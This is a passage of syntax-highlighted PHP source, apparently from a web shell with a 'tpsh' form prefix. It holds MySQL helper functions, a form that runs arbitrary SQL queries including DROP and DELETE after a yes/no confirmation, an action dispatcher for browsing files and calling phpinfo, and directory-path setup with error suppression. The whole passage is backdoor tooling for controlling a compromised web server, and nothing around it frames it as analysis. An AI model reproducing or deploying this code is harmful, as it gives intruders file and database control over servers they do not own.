          <span class="k">if</span> <span class="p">(</span><span class="nv">$print</span><span class="p">)</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="nv">$nl2br</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="nb">nl2br</span><span class="p">(</span><span class="nv">$out</span><span class="p">);}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="nv">$out</span><span class="p">;}}</span>
          <span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_buildwhere&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_buildwhere</span><span class="p">(</span><span class="nv">$array</span><span class="p">,</span><span class="nv">$sep</span><span class="o">=</span><span class="s2">&quot; and&quot;</span><span class="p">,</span><span class="nv">$functs</span><span class="o">=</span><span class="k">array</span><span class="p">())</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$array</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();}</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
          <span class="k">foreach</span><span class="p">(</span><span class="nv">$array</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
            <span class="nv">$value</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;(&quot;</span><span class="p">;}</span>
            <span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;&#39;&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&#39;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$functs</span><span class="p">[</span><span class="nv">$k</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$value</span> <span class="o">.=</span> <span class="s2">&quot;)&quot;</span><span class="p">;}</span>
            <span class="nv">$result</span> <span class="o">.=</span> <span class="s2">&quot;`&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;` = &quot;</span><span class="o">.</span><span class="nv">$value</span><span class="o">.</span><span class="nv">$sep</span><span class="p">;</span>
          <span class="p">}</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="nb">substr</span><span class="p">(</span><span class="nv">$result</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$result</span><span class="p">)</span><span class="o">-</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$sep</span><span class="p">));</span>
          <span class="k">return</span> <span class="nv">$result</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_fetch_all&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_fetch_all</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$query</span><span class="p">);}</span>
          <span class="nv">$array</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="k">while</span> <span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nb">mysql_fetch_array</span><span class="p">(</span><span class="nv">$result</span><span class="p">))</span> <span class="p">{</span><span class="nv">$array</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;}</span>
          <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
          <span class="k">return</span> <span class="nv">$array</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_smarterror&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_smarterror</span><span class="p">(</span><span class="nv">$type</span><span class="p">,</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">(</span><span class="nv">$sock</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="nv">$error</span> <span class="o">=</span> <span class="nb">mysql_error</span><span class="p">();}</span>
          <span class="nv">$error</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$error</span><span class="p">);</span>
          <span class="k">return</span> <span class="nv">$error</span><span class="p">;</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_query_form&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_query_form</span><span class="p">()</span> <span class="p">{</span>
          <span class="k">global</span> <span class="nv">$submit</span><span class="p">,</span><span class="nv">$sql_act</span><span class="p">,</span><span class="nv">$sql_query</span><span class="p">,</span><span class="nv">$sql_query_result</span><span class="p">,</span><span class="nv">$sql_confirm</span><span class="p">,</span><span class="nv">$sql_query_error</span><span class="p">,</span><span class="nv">$tbl_struct</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">((</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_result</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_query_error</span><span class="p">)</span> <span class="p">{</span><span class="nv">$sql_query_error</span> <span class="o">=</span> <span class="s2">&quot;Query was empty&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;&amp;lt;b&amp;gt;Error:&amp;lt;/b&amp;gt; &amp;lt;br&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$sql_query_error</span><span class="o">.</span><span class="s2">&quot;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_act</span> <span class="o">=</span> <span class="nv">$sql_goto</span><span class="p">;}</span>
          <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nv">$submit</span><span class="p">)</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$sql_act</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;&amp;lt;table border=0&amp;gt;&amp;lt;tr&amp;gt;&amp;lt;td&amp;gt;&amp;lt;form name=</span><span class="se">\&quot;</span><span class="s2">tpsh_sqlquery</span><span class="se">\&quot;</span><span class="s2"> method=POST&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="p">;</span> <span class="k">if</span> <span class="p">((</span><span class="nv">$sql_query</span><span class="p">)</span> <span class="k">and</span> <span class="p">(</span><span class="o">!</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Do you really want to&quot;</span><span class="p">;}</span> <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;SQL-Query&quot;</span><span class="p">;}</span> <span class="k">echo</span> <span class="s2">&quot;:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;textarea name=sql_query cols=100 rows=10&amp;gt;&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_query</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/textarea&amp;gt;&amp;lt;br&amp;gt;&amp;lt;br&amp;gt;&amp;lt;input type=hidden name=act value=sql&amp;gt;&amp;lt;input type=hidden name=sql_act value=query&amp;gt;&amp;lt;input type=hidden name=sql_tbl value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_tbl</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=submit value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=hidden name=</span><span class="se">\&quot;</span><span class="s2">sql_goto</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sql_goto</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;input type=submit name=sql_confirm value=</span><span class="se">\&quot;</span><span class="s2">Yes</span><span class="se">\&quot;</span><span class="s2">&amp;gt; &amp;lt;input type=submit value=</span><span class="se">\&quot;</span><span class="s2">No</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;/td&amp;gt;&quot;</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$tbl_struct</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;td valign=</span><span class="se">\&quot;</span><span class="s2">top</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;Fields:&amp;lt;/b&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;</span>
              <span class="k">foreach</span> <span class="p">(</span><span class="nv">$tbl_struct</span> <span class="k">as</span> <span class="nv">$field</span><span class="p">)</span> <span class="p">{</span><span class="nv">$name</span> <span class="o">=</span> <span class="nv">$field</span><span class="p">[</span><span class="s2">&quot;Field&quot;</span><span class="p">];</span> <span class="k">echo</span> <span class="s2">&quot;+ &amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">#</span><span class="se">\&quot;</span><span class="s2"> onclick=</span><span class="se">\&quot;</span><span class="s2">document.tpsh_sqlquery.sql_query.value+=&#39;`&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;`&#39;;</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&quot;</span><span class="o">.</span><span class="nv">$name</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;&quot;</span><span class="p">;}</span>
              <span class="k">echo</span> <span class="s2">&quot;&amp;lt;/td&amp;gt;&amp;lt;/tr&amp;gt;&amp;lt;/table&amp;gt;&quot;</span><span class="p">;</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_query_result</span> <span class="k">or</span> <span class="p">(</span><span class="o">!</span><span class="nv">$sql_confirm</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sql_query</span> <span class="o">=</span> <span class="nv">$sql_last_query</span><span class="p">;}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_create_db&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_create_db</span><span class="p">(</span><span class="nv">$db</span><span class="p">,</span><span class="nv">$sock</span><span class="o">=</span><span class="s2">&quot;&quot;</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$sql</span> <span class="o">=</span> <span class="s2">&quot;CREATE DATABASE `&quot;</span><span class="o">.</span><span class="nb">addslashes</span><span class="p">(</span><span class="nv">$db</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;`;&quot;</span><span class="p">;</span>
          <span class="k">if</span> <span class="p">(</span><span class="nv">$sock</span><span class="p">)</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">,</span><span class="nv">$sock</span><span class="p">);}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="nb">mysql_query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">function_exists</span><span class="p">(</span><span class="s2">&quot;mysql_query_parse&quot;</span><span class="p">))</span> <span class="p">{</span>
        <span class="k">function</span> <span class="nf">mysql_query_parse</span><span class="p">(</span><span class="nv">$query</span><span class="p">)</span> <span class="p">{</span>
          <span class="nv">$query</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nv">$query</span><span class="p">);</span>
          <span class="nv">$arr</span> <span class="o">=</span> <span class="nb">explode</span> <span class="p">(</span><span class="s2">&quot; &quot;</span><span class="p">,</span><span class="nv">$query</span><span class="p">);</span>
          <span class="nv">$types</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
            <span class="s2">&quot;SELECT&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
            <span class="s2">&quot;SHOW&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="mi">1</span><span class="p">),</span>
            <span class="s2">&quot;DELETE&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span>
            <span class="s2">&quot;DROP&quot;</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="k">array</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
          <span class="p">);</span>
          <span class="nv">$result</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
          <span class="nv">$op</span> <span class="o">=</span> <span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
          <span class="k">if</span> <span class="p">(</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]))</span> <span class="p">{</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;propertions&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">];</span>
            <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;query&quot;</span><span class="p">]</span>  <span class="o">=</span> <span class="nv">$query</span><span class="p">;</span>
            <span class="k">if</span> <span class="p">(</span><span class="nv">$types</span><span class="p">[</span><span class="nv">$op</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
              <span class="k">foreach</span><span class="p">(</span><span class="nv">$arr</span> <span class="k">as</span> <span class="nv">$k</span><span class="o">=&amp;</span><span class="nx">gt</span><span class="p">;</span><span class="nv">$v</span><span class="p">)</span> <span class="p">{</span>
                <span class="k">if</span> <span class="p">(</span><span class="nb">strtoupper</span><span class="p">(</span><span class="nv">$v</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;LIMIT&quot;</span><span class="p">)</span> <span class="p">{</span>
                  <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">];</span>
                  <span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;,&quot;</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]);</span>
                  <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="nv">$result</span><span class="p">[</span><span class="s2">&quot;limit&quot;</span><span class="p">][</span><span class="mi">0</span><span class="p">]);}</span>
                  <span class="nb">unset</span><span class="p">(</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="p">],</span><span class="nv">$arr</span><span class="p">[</span><span class="nv">$k</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
                <span class="p">}</span>
              <span class="p">}</span>
            <span class="p">}</span>
          <span class="p">}</span>
          <span class="k">else</span> <span class="p">{</span><span class="k">return</span> <span class="k">FALSE</span><span class="p">;}</span>
        <span class="p">}</span>
      <span class="p">}</span>
      <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;gofile&quot;</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;ls&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nv">$f</span><span class="p">;</span> <span class="p">}</span>
        <span class="k">else</span> <span class="p">{</span> <span class="nv">$act</span> <span class="o">=</span> <span class="s2">&quot;f&quot;</span><span class="p">;</span> <span class="nv">$d</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="nv">$f</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$f</span><span class="p">);</span> <span class="p">}</span>
      <span class="p">}</span>
     
      <span class="o">@</span><span class="nb">ob_start</span><span class="p">();</span>
      <span class="o">@</span><span class="nb">ob_implicit_flush</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Expires: Mon, 26 Jul 1997 05:00:00 GMT&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Last-Modified: &quot;</span><span class="o">.</span><span class="nb">gmdate</span><span class="p">(</span><span class="s2">&quot;D, d M Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; GMT&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: no-store, no-cache, must-revalidate&quot;</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Cache-Control: post-check=0, pre-check=0&quot;</span><span class="p">,</span> <span class="k">FALSE</span><span class="p">);</span>
      <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Pragma: no-cache&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">))</span> <span class="p">{</span>
        <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">ini_get</span><span class="p">(</span><span class="s2">&quot;upload_tmp_dir&quot;</span><span class="p">);</span>
        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tmpdir</span> <span class="o">=</span> <span class="s2">&quot;/tmp/&quot;</span><span class="p">;}</span>
      <span class="p">}</span>
      <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">);</span>
      <span class="nv">$tmpdir</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$tmpdir</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$tmpdir</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$tmpdir</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$tmpdir_logs</span><span class="p">))</span> <span class="p">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nv">$tmpdir</span><span class="p">;}</span>
      <span class="k">else</span> <span class="p">{</span><span class="nv">$tmpdir_logs</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$tmpdir_logs</span><span class="p">);}</span>
      <span class="nv">$sort</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$sort</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$sort</span><span class="p">))</span> <span class="p">{</span><span class="nv">$sort</span> <span class="o">=</span> <span class="nv">$sort_default</span><span class="p">;}</span>
      <span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">strtolower</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
      <span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">=</span> <span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_SOFTWARE&quot;</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">ereg</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">))</span> <span class="p">{</span><span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">.=</span> <span class="s2">&quot;. PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">();}</span>
      <span class="nv">$DISP_SERVER_SOFTWARE</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">(),</span><span class="s2">&quot;&amp;lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=phpinfo</span><span class="se">\&quot;</span><span class="s2"> target=</span><span class="se">\&quot;</span><span class="s2">_blank</span><span class="se">\&quot;</span><span class="s2">&amp;gt;&amp;lt;b&amp;gt;&amp;lt;u&amp;gt;PHP/&quot;</span><span class="o">.</span><span class="nb">phpversion</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;&amp;lt;/u&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&quot;</span><span class="p">,</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$DISP_SERVER_SOFTWARE</span><span class="p">));</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.bg&quot;</span><span class="p">,</span><span class="nv">$highlight_bg</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.comment&quot;</span><span class="p">,</span><span class="nv">$highlight_comment</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.default&quot;</span><span class="p">,</span><span class="nv">$highlight_default</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.html&quot;</span><span class="p">,</span><span class="nv">$highlight_html</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.keyword&quot;</span><span class="p">,</span><span class="nv">$highlight_keyword</span><span class="p">);</span>
      <span class="o">@</span><span class="nb">ini_set</span><span class="p">(</span><span class="s2">&quot;highlight.string&quot;</span><span class="p">,</span><span class="nv">$highlight_string</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_array</span><span class="p">(</span><span class="nv">$actbox</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$actbox</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span> <span class="p">}</span>
      <span class="nv">$dspact</span> <span class="o">=</span> <span class="nv">$act</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$act</span><span class="p">);</span>
      <span class="nv">$disp_fullpath</span> <span class="o">=</span> <span class="nv">$ls_arr</span> <span class="o">=</span> <span class="nv">$notls</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
      <span class="nv">$ud</span> <span class="o">=</span> <span class="o">@</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="s2">&quot;.&quot;</span><span class="p">);}</span>
      <span class="k">elseif</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">))</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$d</span><span class="p">);}</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
      <span class="k">if</span> <span class="p">(</span><span class="nb">substr</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">!=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">)</span> <span class="p">{</span><span class="nv">$d</span> <span class="o">.=</span> <span class="nx">DIRECTORY_SEPARATOR</span><span class="p">;}</span>
      <span class="nv">$d</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\\\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$d</span><span class="p">);</span>
      <span class="nv">$dispd</span> <span class="o">=</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$d</span><span class="p">);</span>
